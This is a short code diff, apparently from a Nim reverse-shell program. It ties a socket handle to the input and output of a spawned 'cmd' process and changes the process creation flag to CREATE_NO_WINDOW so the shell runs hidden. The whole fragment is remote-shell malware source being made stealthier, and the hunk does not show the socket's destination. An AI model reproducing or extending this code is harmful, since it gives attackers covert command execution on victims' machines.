@@ -37,7 +37,7 @@ proc main() =
   si.hStdOutput = cast[HANDLE](soc)
   si.hStdError = cast[HANDLE](soc)
 
-  CreateProcessA(NULL, "cmd".cstring, NULL, NULL, TRUE, 0, NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr)
+  CreateProcessA(NULL, "cmd".cstring, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr)
 
 when isMainModule:
   main()
